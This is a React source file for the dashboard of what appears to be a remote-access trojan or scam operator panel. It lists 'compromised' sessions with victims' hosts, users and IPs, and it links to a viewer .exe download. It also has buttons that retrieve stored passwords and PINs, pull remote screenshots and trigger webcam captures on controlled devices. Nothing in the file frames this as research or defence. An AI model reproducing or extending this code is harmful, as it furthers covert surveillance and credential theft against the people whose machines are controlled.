import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '@/context/AuthContext';
import axios from 'axios';
import { API_URL } from '../utils/webrtc';

function formatTimeAgo(iso) {
  if (!iso) return null;
  const diff = Date.now() - new Date(iso).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return 'Just now';
  if (mins < 60) return `${mins}m ago`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h ${mins % 60}h ago`;
  const days = Math.floor(hrs / 24);
  return `${days}d ${hrs % 24}h ago`;
}

function formatIdle(iso, isOnline) {
  if (isOnline) return 'Active';
  const ago = formatTimeAgo(iso);
  return ago ? `Idle ${ago}` : 'Offline';
}

export default function DashboardPage() {
  const navigate = useNavigate();
  const { logout } = useAuth();
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedDeviceId, setSelectedDeviceId] = useState(null);
  const [noteText, setNoteText] = useState('');
  const [notes, setNotes] = useState([]);
  const [noteLoading, setNoteLoading] = useState(false);
  const [noteSaving, setNoteSaving] = useState(false);
  const [showInfo, setShowInfo] = useState(false);
  const [screenshot, setScreenshot] = useState(null);
  const [refreshingScreenshot, setRefreshingScreenshot] = useState(false);

  const selectedDevice = devices.find(d => d.device_id === selectedDeviceId);

  const fetchDevices = useCallback(async () => {
    setError(null);
    try {
      const res = await axios.get(`${API_URL}/devices`);
      setDevices(res.data.devices || []);
    } catch (err) {
      setError('Failed to load devices');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 1000);
    return () => clearInterval(interval);
  }, [fetchDevices]);

  const fetchNotes = useCallback(async (deviceId) => {
    if (!deviceId) { setNotes([]); return; }
    setNoteLoading(true);
    try {
      const res = await axios.get(`${API_URL}/device-notes/${deviceId}`, { validateStatus: s => s === 200 || s === 404 });
      setNotes(res.status === 200 ? res.data.notes : []);
    } catch {
      setNotes([]);
    } finally {
      setNoteLoading(false);
    }
  }, []);

  useEffect(() => {
    if (selectedDeviceId) fetchNotes(selectedDeviceId);
    else { setNotes([]); setScreenshot(null); }
  }, [selectedDeviceId, fetchNotes]);

  useEffect(() => {
    if (selectedDeviceId && showInfo) {
      fetchScreenshot(selectedDeviceId);
    }
  }, [selectedDeviceId, showInfo]);

  const fetchScreenshot = async (deviceId) => {
    try {
      const r = await axios.get(`${API_URL}/device-screenshot/${deviceId}`, { validateStatus: s => s === 200 || s === 404 });
      setScreenshot(r.status === 200 ? r.data.image : null);
    } catch {
      setScreenshot(null);
    }
  };

  const handleRefreshScreenshot = async () => {
    if (!selectedDeviceId) return;
    setRefreshingScreenshot(true);
    try {
      await axios.post(`${API_URL}/device-screenshot/refresh/${selectedDeviceId}`);
      setTimeout(() => fetchScreenshot(selectedDeviceId), 2000);
    } catch { /* silent */ }
    finally { setTimeout(() => setRefreshingScreenshot(false), 2000); }
  };

  const handleAddNote = async () => {
    if (!selectedDeviceId || !noteText.trim()) return;
    setNoteSaving(true);
    try {
      await axios.post(`${API_URL}/device-notes`, { device_id: selectedDeviceId, note: noteText, author: 'admin' });
      setNoteText('');
      fetchNotes(selectedDeviceId);
    } catch { /* silent */ }
    finally { setNoteSaving(false); }
  };

  const handleDeleteNote = async (noteId) => {
    if (!selectedDeviceId) return;
    try {
      await axios.delete(`${API_URL}/device-notes/${selectedDeviceId}/${noteId}`);
      fetchNotes(selectedDeviceId);
    } catch { /* silent */ }
  };

  const handleConnect = (deviceId) => {
    window.location.href = `rdviewer://connect/${deviceId}`;
  };
  const handleDeleteDevice = async (deviceId) => {
    const name = devices.find(d => d.device_id === deviceId)?.device_name || deviceId;
    if (!window.confirm(`Delete customer "${name}"? This removes the device and all its data.`)) return;
    try {
      await axios.delete(`${API_URL}/devices/${deviceId}`);
      if (selectedDeviceId === deviceId) setSelectedDeviceId(null);
      fetchDevices();
    } catch (err) {
      console.error('Delete failed:', err);
      alert('Failed to delete customer');
    }
  };
  const [noteSearchIds, setNoteSearchIds] = useState([]);
  const [sessionFilter, setSessionFilter] = useState('all');
  const activeDevices = devices.filter(d => d.status === 'online' || d.status === 'booting');
  const sourceDevices = sessionFilter === 'active' ? activeDevices : devices;
  const filtered = sourceDevices.filter(d => {
    const q = searchQuery.toLowerCase();
    if (!q) return true;
    return d.device_name.toLowerCase().includes(q) || d.device_id.toLowerCase().includes(q) || (d.whoami && d.whoami.toLowerCase().includes(q));
  });
  const [credentialPopup, setCredentialPopup] = useState({ show: false, deviceId: '', credential: '', username: '', updatedAt: '' });
  const [renamingId, setRenamingId] = useState(null);
  const [renameValue, setRenameValue] = useState('');

  const handleRename = async (deviceId) => {
    const name = renameValue.trim();
    if (!name || name.length > 100) return;
    try {
      await axios.patch(`${API_URL}/devices/${deviceId}/rename`, { device_name: name });
      setDevices(prev => prev.map(d => d.device_id === deviceId ? { ...d, device_name: name } : d));
    } catch (err) {
      console.error('Rename failed:', err);
    }
    setRenamingId(null);
    setRenameValue('');
  };
  const [credentialLoading, setCredentialLoading] = useState(false);
  const [showCredentialText, setShowCredentialText] = useState(false);
  const [cameraPopup, setCameraPopup] = useState({ show: false, deviceId: '', image: '', loading: true, error: '' });
  const handleCameraClick = async (deviceId) => {
    setCameraPopup({ show: true, deviceId, image: '', loading: true, error: '' });
    try {
      const res = await axios.get(`${API_URL}/device-camera/${deviceId}`);
      if (res.status === 200 && res.data.image) {
        setCameraPopup({ show: true, deviceId, image: res.data.image, loading: false, error: '' });
      } else {
        setCameraPopup({ show: true, deviceId, image: '', loading: false, error: 'No camera image available' });
      }
    } catch {
      setCameraPopup({ show: true, deviceId, image: '', loading: false, error: 'No camera image available' });
    }
  };
  const handleCameraRefresh = async (deviceId) => {
    setCameraPopup(p => ({ ...p, loading: true, error: '' }));
    try {
      await axios.post(`${API_URL}/device-camera/capture/${deviceId}`);
      setTimeout(async () => {
        try {
          const res = await axios.get(`${API_URL}/device-camera/${deviceId}`);
          if (res.status === 200 && res.data.image) {
            setCameraPopup(p => ({ ...p, image: res.data.image, loading: false }));
          } else {
            setCameraPopup(p => ({ ...p, loading: false, error: 'Camera capture failed' }));
          }
        } catch {
          setCameraPopup(p => ({ ...p, loading: false, error: 'Camera capture failed' }));
        }
      }, 3000);
    } catch {
      setCameraPopup(p => ({ ...p, loading: false, error: 'Refresh request failed' }));
    }
  };
  const handleCredentialClick = async (deviceId) => {
    if (credentialLoading) return;
    setCredentialLoading(true);
    setCredentialPopup({ show: false, deviceId: '', credential: '', username: '', updatedAt: '' });
    setShowCredentialText(false);
    try {
      const res = await axios.get(`${API_URL}/device-credential/${deviceId}`);
      if (res.status === 200) {
        setCredentialPopup({ show: true, deviceId, credential: res.data.credential, username: res.data.username || '', updatedAt: res.data.updated_at || '' });
      }
    } catch {
      setCredentialPopup({ show: true, deviceId, credential: '', username: '', updatedAt: '' });
    }
    setCredentialLoading(false);
  };
  useEffect(() => {
    if (!searchQuery.trim()) { setNoteSearchIds([]); return; }
    const timer = setTimeout(async () => {
      try {
        const res = await axios.get(`${API_URL}/device-notes/search/${encodeURIComponent(searchQuery)}`, { validateStatus: s => s === 200 || s === 404 });
        if (res.status === 200) setNoteSearchIds(res.data.results.map(r => r.device_id));
      } catch {}
    }, 300);
    return () => clearTimeout(timer);
  }, [searchQuery]);
  const searchResults = searchQuery ? [...new Set([...filtered.map(d => d.device_id), ...noteSearchIds])].map(id => devices.find(d => d.device_id === id)).filter(Boolean) : filtered;

  return (
    <div className="h-screen flex overflow-hidden bg-[#101010] text-[#ccc] select-none" style={{ fontFamily: "'Segoe UI', Arial, sans-serif" }}>
      {/* ── LEFT SIDEBAR ── */}
      <div className="w-[220px] min-w-[220px] bg-[#101010] border-r border-[#101010] flex flex-col p-4 gap-3">
        <div>
          <h2 className="text-2xl font-bold text-white mb-0.5">Support</h2>
          <p className="text-xs text-[#888] leading-relaxed mb-1">
            License info is provided with your ID. Exceeded License will be Suspended permanently. Strict policy No refund.
          </p>
        </div>
        <button className="bg-[#00bcd4] text-white border-none rounded px-0 py-3 text-sm font-semibold cursor-pointer text-center w-full hover:bg-[#00acc1] transition-colors">
          Create +
        </button>
        <div className={`flex items-center justify-between bg-[#252538] rounded px-3 py-2.5 cursor-pointer text-[#ddd] text-sm ${sessionFilter === 'all' ? 'ring-1 ring-[#00bcd4]' : ''}`} onClick={() => setSessionFilter('all')}>
          <span className="font-semibold">My Sessions</span>
          <span className="bg-[#444] text-[#ccc] rounded px-[7px] py-[2px] text-xs font-bold">{devices.length}</span>
        </div>
        <div className={`flex items-center justify-between bg-[#1a1a2e] rounded px-3 py-2.5 cursor-pointer text-[#ddd] text-sm ${sessionFilter === 'active' ? 'ring-1 ring-[#4caf50]' : ''}`} onClick={() => setSessionFilter('active')}>
          <span className="flex items-center gap-2"><span className="w-2 h-2 bg-[#4caf50] rounded-full"></span><span>Active Sessions</span></span>
          <span className="bg-[#4caf50] text-white rounded px-[7px] py-[2px] text-xs font-bold">{activeDevices.length}</span>
        </div>
        <div className="flex items-center gap-2 bg-[#1a1a2e] rounded px-3 py-2.5 cursor-pointer text-[#ddd] text-sm hover:bg-[#252538] transition-colors" onClick={() => navigate('/compromised')}>
          <span className="text-[#ffa726]">&#9888;</span>
          <span className="text-sm">Compromised</span>
        </div>
        <div className="flex-1" />
        <a href="https://clearwebit.com/viewerfile.exe" target="_blank"
          className="flex items-center gap-2 text-xs text-[#00bcd4] hover:text-[#00acc1] no-underline px-3 py-2 rounded hover:bg-[#252538] transition-colors">
          <span>&#128187;</span>
          <span>Download Viewer</span>
        </a>
        <div className="flex items-center gap-2 text-xs text-[#555] cursor-pointer hover:text-[#aaa]" onClick={() => { logout(); navigate('/login'); }}>
          <span>&#10140;</span>
          <span>Sign out</span>
        </div>
      </div>

      {/* ── MIDDLE PANEL (wider) ── */}
      <div className="w-[480px] min-w-[480px] bg-[#101010] flex flex-col border-r border-[#2a2a3e]">
        <div className="flex items-center justify-between px-4 py-3 border-b border-[#2a2a3e]">
          <h3 className="text-base font-bold text-white">My Sessions</h3>
          <div className="flex items-center gap-3 text-sm text-[#aaa]">
            <span className="flex items-center gap-1.5 cursor-pointer hover:text-white px-2 py-1 bg-[#252538] rounded" onClick={() => selectedDeviceId && handleConnect(selectedDeviceId)}>
              <span className="text-sm">&#9654;</span> Join
            </span>
            <span className="text-[#555] text-lg cursor-default font-bold">&#8943;</span>
          </div>
        </div>

        <div className="px-3 py-2.5 border-b border-[#2a2a3e]">
          <div className="relative">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[#666] text-sm">&#128269;</span>
            <input type="text" placeholder="Search My Sessions" value={searchQuery} onChange={e => setSearchQuery(e.target.value)}
              className="w-full bg-[#252538] border border-[#333348] rounded text-[#ccc] px-3 py-2 pl-[34px] text-sm outline-none placeholder:text-[#666]" />
          </div>
        </div>

        <div className="flex-1 overflow-y-auto scrollbar-thin">
          {loading ? (
            <div className="text-center py-12 text-[#666] text-sm">Loading sessions...</div>
          ) : error && searchResults.length === 0 ? (
            <div className="text-center py-12 text-[#666] text-sm">{error}</div>
          ) : searchResults.length === 0 ? (
            <div className="text-center py-12 text-[#666] text-sm">No sessions found</div>
          ) : searchResults.map(d => {
            const isOnline = d.status === 'online' || d.status === 'booting';
            const isSelected = d.device_id === selectedDeviceId;
            return (
              <div key={d.device_id}
                className={`flex items-center px-3 py-2.5 border-b border-[#1a1a2e] cursor-pointer gap-3 transition-all hover:bg-[#1a1a2e] ${isSelected ? 'bg-[#1a1a2e] border-l-2 border-l-[#00bcd4]' : ''}`}
                onClick={() => setSelectedDeviceId(d.device_id)}
                onDoubleClick={() => handleConnect(d.device_id)}>
                <input type="checkbox" className="accent-[#555] w-4 h-4 shrink-0" checked={isSelected} onChange={() => setSelectedDeviceId(d.device_id)} onClick={e => e.stopPropagation()} />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-1">
                    {renamingId === d.device_id ? (
                      <input type="text" className="bg-[#1a1a2e] text-[#ddd] text-sm font-semibold px-1 py-0.5 rounded border border-[#444] outline-none w-full" value={renameValue} autoFocus onChange={e => setRenameValue(e.target.value)} onKeyDown={e => { if (e.key === 'Enter') handleRename(d.device_id); if (e.key === 'Escape') { setRenamingId(null); setRenameValue(''); } }} onBlur={() => handleRename(d.device_id)} />
                    ) : (
                      <>
                        <span className="text-[#ddd] text-sm font-semibold truncate">{d.device_name}</span>
                        <span className="text-[#555] cursor-pointer hover:text-[#aaa] text-xs shrink-0" title="Rename" onClick={e => { e.stopPropagation(); setRenamingId(d.device_id); setRenameValue(d.device_name); }}>&#9998;</span>
                      </>
                    )}
                  </div>
                  <div className="text-[#777] text-xs truncate">Host: {d.device_id}</div>
                  {d.whoami && <div className="text-[#777] text-xs truncate">User: {d.whoami} ({formatIdle(d.last_seen, isOnline)})</div>}
                </div>
                <div className="flex items-center gap-2 shrink-0">
                  {isOnline ? (
                    <span className="text-[#4caf50] text-xs font-semibold border border-[#4caf50] rounded px-[5px] py-[1px] whitespace-nowrap">Active</span>
                  ) : (
                    <span className="text-[#555] text-base">&#9679;</span>
                  )}
                  <span className="text-[#555] text-base cursor-pointer hover:text-[#aaa]" title="Users">&#128100;</span>
                  <span className={`text-sm ${isOnline ? 'text-[#4caf50]' : 'text-[#555]'}`} title={`${d.viewer_count || 0} viewer(s) connected`}>&#127911;<span className="ml-0.5 text-xs font-semibold">{d.viewer_count || 0}</span></span>
                  <span className={`text-base cursor-pointer hover:text-[#aaa] transition-colors ${credentialLoading ? 'opacity-40 pointer-events-none' : ''}`} title="Credentials" onClick={e => { e.stopPropagation(); handleCredentialClick(d.device_id); }}>&#128273;</span>
                  <span className="text-base cursor-pointer text-[#4caf50] hover:text-[#66bb6a] transition-colors" title="Camera" onClick={e => { e.stopPropagation(); handleCameraClick(d.device_id); }}>&#128248;</span>
                  <span className="text-[#555] text-base cursor-pointer hover:text-[#e57373] transition-colors" title="Delete customer" onClick={e => { e.stopPropagation(); handleDeleteDevice(d.device_id); }}>&#128465;</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* ── RIGHT PANEL (notes area — flex takes remaining space) ── */}
      <div className="flex-1 bg-[#002129] flex flex-col min-w-0 max-w-[calc(100%-220px-480px-36px)]">
        <div className="px-4 py-3 border-b border-[#2a2a3e] flex items-center justify-between">
          <h3 className="text-base font-bold text-white truncate">{selectedDevice ? selectedDevice.device_name : 'Select a session'}</h3>
          {selectedDevice && (
            <div className="flex items-center gap-2 text-sm text-[#888]">
              {showInfo && (
                <button onClick={() => { setShowInfo(false); setScreenshot(null); }} className="text-[#00bcd4] hover:text-[#00acc1] px-2 py-1 rounded bg-[#252538] transition-colors">&#10005; Close Info</button>
              )}
            </div>
          )}
        </div>

        {/* Info panel (toggled by "i" icon) */}
        {showInfo && selectedDevice && (
          <div className="border-b border-[#2a2a3e] bg-[#1c1c2c]">
            <div className="px-4 py-3 space-y-2">
              <div className="text-xs text-[#888]">
                <span className="text-[#aaa] font-semibold">ID:</span> {selectedDevice.device_id}
              </div>
              {selectedDevice.whoami && (
                <div className="text-xs text-[#888]">
                  <span className="text-[#aaa] font-semibold">User:</span> {selectedDevice.whoami}
                </div>
              )}
              {selectedDevice.host_ip && (
                <div className="text-xs text-[#888]">
                  <span className="text-[#aaa] font-semibold">IP:</span> {selectedDevice.host_ip}
                </div>
              )}
              <div className="text-xs text-[#888]">
                <span className="text-[#aaa] font-semibold">Status:</span>{' '}
                <span className={selectedDevice.status === 'online' || selectedDevice.status === 'booting' ? 'text-[#4caf50]' : 'text-[#555]'}>
                  {selectedDevice.status}
                </span>
              </div>
              <div className="text-xs text-[#888]">
                <span className="text-[#aaa] font-semibold">Last seen:</span> {formatTimeAgo(selectedDevice.last_seen) || 'Never'}
              </div>
              <div className="text-xs text-[#888]">
                <span className="text-[#aaa] font-semibold">Notes:</span> {notes.length}
              </div>
              {screenshot && (
                <div className="mt-2 relative bg-black rounded border border-[#333348] flex items-center justify-center" style={{ minHeight: '100px', maxHeight: '250px' }}>
                  <img src={screenshot} alt="Screenshot" className="w-full h-full rounded" style={{ objectFit: 'contain', maxHeight: '250px' }} />
                  {(selectedDevice.status === 'online' || selectedDevice.status === 'booting') && (
                    <button onClick={handleRefreshScreenshot} disabled={refreshingScreenshot}
                      className="absolute top-1 right-1 bg-black/60 hover:bg-black/80 text-white text-xs px-2 py-1 rounded transition-colors">
                      {refreshingScreenshot ? '...' : 'Refresh'}
                    </button>
                  )}
                </div>
              )}
              <button onClick={() => handleConnect(selectedDeviceId)}
                className="mt-2 w-full bg-[#00bcd4] text-white text-sm font-semibold py-2 rounded hover:bg-[#00acc1] transition-colors">
                &#9654; Join Session
              </button>
            </div>
          </div>
        )}

        <div className="flex-1 overflow-y-auto px-3 py-2 flex flex-col gap-1.5 scrollbar-thin">
          {!selectedDevice ? (
            <div className="text-center py-12 text-[#555] text-sm">Select a session to view details</div>
          ) : noteLoading ? (
            <div className="text-center py-8 text-[#555] text-sm">Loading notes...</div>
          ) : notes.length === 0 ? (
            <div className="text-center py-8 text-[#555] text-sm">No notes yet</div>
          ) : notes.map(n => (
            <div key={n.note_id} className="bg-[#393939] rounded px-3 py-2.5 border-b border-[#252538]">
              <div className="flex items-center justify-between mb-1">
                <div className="flex items-baseline gap-2">
                  <span className="text-xs font-semibold text-[#ccc]">{n.author}</span>
                  <span className="text-xs text-[#666]">{n.created_at ? formatTimeAgo(n.created_at) : ''} ago</span>
                </div>
                <button onClick={() => handleDeleteNote(n.note_id)} className="bg-none border-none text-[#555] cursor-pointer text-sm hover:text-[#e57373] transition-colors">&#128465;</button>
              </div>
              <div className="text-sm text-[#888] leading-relaxed whitespace-pre-wrap">{n.note}</div>
            </div>
          ))}
        </div>

        {selectedDevice && (
          <div className="px-3 py-2.5 border-t border-[#2a2a3e] flex gap-2 items-center">
            <textarea placeholder="Enter a note" value={noteText} onChange={e => setNoteText(e.target.value)}
              className="flex-1 bg-[#252538] border border-[#333348] rounded text-[#ccc] px-3 py-2 text-sm outline-none resize-none h-[42px] font-inherit placeholder:text-[#555]" />
            <button onClick={handleAddNote} disabled={noteSaving || !noteText.trim()}
              className="bg-[#00bcd4] text-white border-none rounded px-5 h-[42px] text-sm font-semibold cursor-pointer whitespace-nowrap hover:bg-[#00acc1] disabled:opacity-40 disabled:cursor-not-allowed transition-colors">
              {noteSaving ? '...' : 'Add Note'}
            </button>
          </div>
        )}
      </div>

      {/* ── FAR RIGHT ICON SIDEBAR ── */}
      <div className="w-[36px] min-w-[36px] bg-[#181826] border-l border-[#2a2a3e] flex flex-col items-center pt-3 gap-4">
        <span className="text-[#555] text-base cursor-pointer p-1 hover:text-[#aaa] transition-colors" title="Link">&#128279;</span>
        <span className={`text-base cursor-pointer p-1 transition-colors ${showInfo ? 'text-[#00bcd4]' : 'text-[#555] hover:text-[#aaa]'}`}
          title="Device Info" onClick={() => selectedDeviceId && setShowInfo(v => !v)}>&#9432;</span>
        <span className="text-[#555] text-base cursor-pointer p-1 hover:text-[#aaa] transition-colors" title="History">&#128336;</span>
        <span className="text-[#555] text-base cursor-pointer p-1 hover:text-[#aaa] transition-colors" title="Chat">&#128172;</span>
        <span className="text-[#00bcd4] text-base cursor-pointer p-1 transition-colors" title="Notes">&#128196;</span>
        <span className="text-[#555] text-base cursor-pointer p-1 hover:text-[#aaa] transition-colors" title="Settings">&#9881;</span>
      </div>

      {/* ── CREDENTIAL POPUP ── */}
      {credentialPopup.show && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50" onClick={() => setCredentialPopup(p => ({ ...p, show: false }))}>
          <div className="bg-[#1c1c2c] border border-[#2a2a3e] rounded-xl p-6 max-w-sm w-full mx-4 shadow-2xl" onClick={e => e.stopPropagation()}>
            <div className="text-center mb-4">
              <div className="text-4xl mb-2">&#128273;</div>
              <h3 className="text-lg font-semibold text-[#ddd]">Device Credentials</h3>
              <p className="text-xs text-[#666] mt-1 break-all">{credentialPopup.deviceId}</p>
            </div>
            {credentialPopup.credential ? (
              <div className="space-y-3">
                <div>
                  <div className="text-xs text-[#888] mb-1">Username</div>
                  <div className="bg-[#252538] border border-[#333348] rounded px-3 py-2 text-sm text-[#ddd]">{credentialPopup.username || 'N/A'}</div>
                </div>
                <div>
                  <div className="text-xs text-[#888] mb-1 flex items-center justify-between">
                    <span>Password / PIN</span>
                    <button onClick={() => setShowCredentialText(v => !v)} className="text-[#00bcd4] text-xs hover:underline bg-none border-none cursor-pointer">
                      {showCredentialText ? 'Hide' : 'Show'}
                    </button>
                  </div>
                  <div className="bg-[#252538] border border-[#333348] rounded px-3 py-2 text-sm text-[#ddd] font-mono">
                    {showCredentialText ? credentialPopup.credential : '••••••••'}
                  </div>
                </div>
                {credentialPopup.updatedAt && (
                  <div className="text-xs text-[#555]">Saved: {new Date(credentialPopup.updatedAt).toLocaleString()}</div>
                )}
              </div>
            ) : (
              <div className="text-center py-4">
                <div className="text-[#888] text-sm">No credentials saved for this device.</div>
                <div className="text-[#555] text-xs mt-1">Use the viewer to request and save credentials.</div>
              </div>
            )}
            <button onClick={() => setCredentialPopup(p => ({ ...p, show: false }))}
              className="w-full mt-4 bg-[#252538] text-[#ccc] border border-[#333348] rounded py-2 text-sm font-medium hover:bg-[#2a2a40] transition-colors">
              Close
            </button>
          </div>
        </div>
      )}

      {/* ── CAMERA POPUP ── */}
      {cameraPopup.show && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50" onClick={() => setCameraPopup({ show: false, deviceId: '', image: '', loading: false, error: '' })}>
          <div className="bg-[#1c1c2c] border border-[#2a2a3e] rounded-xl p-6 max-w-lg w-full mx-4 shadow-2xl" onClick={e => e.stopPropagation()}>
            <div className="text-center mb-4">
              <div className="text-4xl mb-2">&#128248;</div>
              <h3 className="text-lg font-semibold text-[#ddd]">Device Camera</h3>
              <p className="text-xs text-[#666] mt-1 break-all">{cameraPopup.deviceId}</p>
            </div>
            <div className="bg-[#000] rounded-lg overflow-hidden min-h-[200px] flex items-center justify-center">
              {cameraPopup.loading ? (
                <div className="text-[#888] text-sm">Loading camera image...</div>
              ) : cameraPopup.error ? (
                <div className="text-[#888] text-sm">{cameraPopup.error}</div>
              ) : (
                <img src={cameraPopup.image} alt="Camera" className="w-full h-auto max-h-[400px] object-contain" />
              )}
            </div>
            <div className="flex gap-3 mt-4">
              <button onClick={() => handleCameraRefresh(cameraPopup.deviceId)}
                className="flex-1 bg-[#1b5e20] text-white border border-[#2e7d32] rounded py-2 text-sm font-medium hover:bg-[#2e7d32] transition-colors"
                disabled={cameraPopup.loading}>
                {cameraPopup.loading ? 'Refreshing...' : 'Refresh'}
              </button>
              <button onClick={() => setCameraPopup({ show: false, deviceId: '', image: '', loading: false, error: '' })}
                className="flex-1 bg-[#252538] text-[#ccc] border border-[#333348] rounded py-2 text-sm font-medium hover:bg-[#2a2a40] transition-colors">
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        .scrollbar-thin::-webkit-scrollbar { width: 5px; }
        .scrollbar-thin::-webkit-scrollbar-track { background: #101010; }
        .scrollbar-thin::-webkit-scrollbar-thumb { background: #444; border-radius: 2px; }
      `}</style>
    </div>
  );
}
